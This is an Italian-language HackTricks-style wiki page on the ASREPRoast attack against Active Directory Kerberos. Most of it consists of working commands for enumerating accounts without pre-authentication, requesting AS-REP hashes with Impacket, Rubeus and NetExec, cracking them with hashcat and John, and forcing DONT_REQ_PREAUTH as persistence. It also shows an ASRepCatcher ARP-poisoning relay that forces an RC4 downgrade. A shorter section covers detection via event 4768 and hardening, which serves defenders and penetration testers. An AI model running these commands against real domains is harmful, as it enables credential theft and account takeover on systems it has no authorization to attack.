# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast è un attacco alla sicurezza che sfrutta gli utenti per i quali non è impostato l'attributo **Kerberos pre-authentication required**. In sostanza, questa vulnerabilità consente agli attaccanti di richiedere l'autenticazione di un utente al Domain Controller (DC) senza aver bisogno della password dell'utente. Il DC risponde quindi con un messaggio cifrato con una chiave derivata dalla password dell'utente, che gli attaccanti possono tentare di decifrare offline per scoprire la password.

I requisiti principali per questo attacco sono:

- **Assenza della pre-autenticazione Kerberos**: questa funzionalità di sicurezza non deve essere abilitata per gli utenti presi di mira.
- **Connessione al Domain Controller (DC)**: gli attaccanti devono poter accedere al DC per inviare richieste e ricevere messaggi cifrati.
- **Account di dominio facoltativo**: avere un account di dominio consente agli attaccanti di identificare più efficacemente gli utenti vulnerabili tramite query LDAP. Senza un account di questo tipo, gli attaccanti devono indovinare i nomi utente.

#### Enumerare gli utenti vulnerabili (sono necessarie credenziali di dominio)

```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```

#### Richiesta del messaggio AS_REP

```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```

> [!WARNING]
> Rubeus richiede **RC4** per impostazione predefinita, quindi l'Event ID **4768** mostra solitamente **preauth type 0** e **ticket encryption type 0x17**. Se aggiungi **`/aes`** (o RC4 è disabilitato per il target), aspettati invece **AES etypes**.<sup>[[2]](#references)</sup>

#### Comandi rapidi (Linux)

- Enumera prima i potenziali target (ad esempio, dai percorsi di build trapelati) con Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Esegui il roast di un'intera lista di nomi utente senza credenziali valide usando NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- Se disponi di credenziali, lascia che NetExec interroghi LDAP e richieda per te ogni account vulnerabile al roast: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- Se l'output inizia con **`$krb5asrep$23$`**, esegui il cracking con Hashcat **`-m 18200`**. Se inizia con **`$krb5asrep$17$`** o **`$krb5asrep$18$`**, preferisci John con **`--format=krb5asrep`**.<sup>[[1]](#references)[[2]](#references)</sup>

### Cracking

Non dare per scontato che ogni AS-REP roast usi RC4. Gli strumenti moderni possono restituire **RC4** (`$krb5asrep$23$`) o **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`), a seconda dell'enctype richiesto/negoziato. **`hashcat -m 18200`** è per **etype 23**, mentre **John** gestisce direttamente `krb5asrep` per **17/18/23**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```

### Persistenza

Forza **preauth** non richiesto per un utente per cui disponi di autorizzazioni **GenericAll** (o di autorizzazioni per scrivere proprietà):

```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```

### Rilevamento e hardening

Una **richiesta AS-REP senza preautenticazione** riuscita genera un evento **4768** sul DC con `Status=0x0` e `PreAuthType=0`; questo registra una richiesta, non dimostra che qualcuno abbia crackato la risposta o compromesso l'account. Non richiedere RC4 per il rilevamento: `TicketEncryptionType=0x17` è un utile indicatore di cifratura debole, ma un attacker può richiedere AES (valori del log eventi `0x11`/`0x12`). Su Windows Server 2016 e versioni successive con l'aggiornamento cumulativo del 14 gennaio 2025 (o più recente), la versione 2 dell'evento 4768 espone anche `ClientAdvertizedEncryptionTypes`, gli etype supportati dall'account/DC e le chiavi disponibili.<sup>[[5]](#references)</sup>

Una ricerca pratica segnala un client che annuncia solo RC4 mentre l'account dispone di chiavi AES, quindi correla le raffiche di richieste provenienti da un singolo IP sorgente e dirette a diversi utenti senza preautenticazione. Definisci una baseline per le eccezioni legittime invece di generare un alert per ogni evento `PreAuthType=0`.

Per l'attribuzione, normalizza il campo `IpAddress` (che può contenere indirizzi IPv4 mappati con `::ffff:`) e confronta la finestra temporale con gli eventi 4769 dei service ticket o 5140 di accesso alle share. Questi eventi possono indicare account attivi dallo stesso indirizzo, ma una richiesta AS-REP senza preautenticazione non richiede un account autenticato. Host condivisi, NAT, proxy e sessioni multiple fanno sì che la corrispondenza di un IP **non** identifichi la persona o l'account che ha inviato l'AS-REQ. Considera gli account correlati come piste investigative e verifica le informazioni con prove provenienti dagli endpoint o dalla rete.<sup>[[5]](#references)[[7]](#references)[[8]](#references)</sup>

La soluzione duratura è deselezionare **Do not require Kerberos preauthentication** per ogni utente che non ne ha strettamente bisogno e ruotare le password degli account esposti. Se non è possibile rimuovere un'eccezione, usa una password lunga e generata casualmente e assegna privilegi minimi. Disabilitare RC4 aumenta il costo del cracking, ma non elimina la possibilità di effettuare il roast, perché le risposte AS-REP AES restano crackabili offline.<sup>[[2]](#references)[[5]](#references)</sup>

## ASREProast senza credenziali

Un attacker on-path può acquisire l'AS-REP restituito durante un normale scambio AS con preautenticazione e formattarne la parte cifrata per il cracking offline. A differenza dell'ASREPRoasting classico, non richiede `DONT_REQ_PREAUTH`; tuttavia, restituisce solo gli account il cui scambio Kerberos viene effettivamente intercettato. **ASRepCatcher** ottiene la posizione con ARP poisoning unidirezionale per impostazione predefinita, oppure può acquisire il traffico proveniente da un'altra tecnica MitM con `--disable-spoofing`.<sup>[[6]](#references)</sup>\
Se ti interessa il trucco correlato senza credenziali che restituisce un **service ticket** invece di un **TGT** da un principal senza preautenticazione, consulta [Kerberoast](kerberoast.md).

In modalità `relay`, [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) inoltra gli AS-REQ intercettati e forza **RC4** quando entrambi i lati lo consentono ancora. `listen` non modifica i pacchetti e acquisisce quindi l'enctype negoziato dal client e dal DC. Quando possibile, limita il poisoning con `-t`/`-tf` invece di coinvolgere l'intera subnet.<sup>[[6]](#references)</sup>

```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen

# Scope targets and save directly in Hashcat format
ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -format hashcat
```

---

---

## References

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [Microsoft – Evento 4768: è stato richiesto un ticket di autenticazione Kerberos](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [6] [Yaxxine7 – ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)
- [7] [Microsoft – Evento di sicurezza 4769](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [8] [Microsoft – Evento di sicurezza 5140](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-5140)
{{#include ../../banners/hacktricks-training.md}}
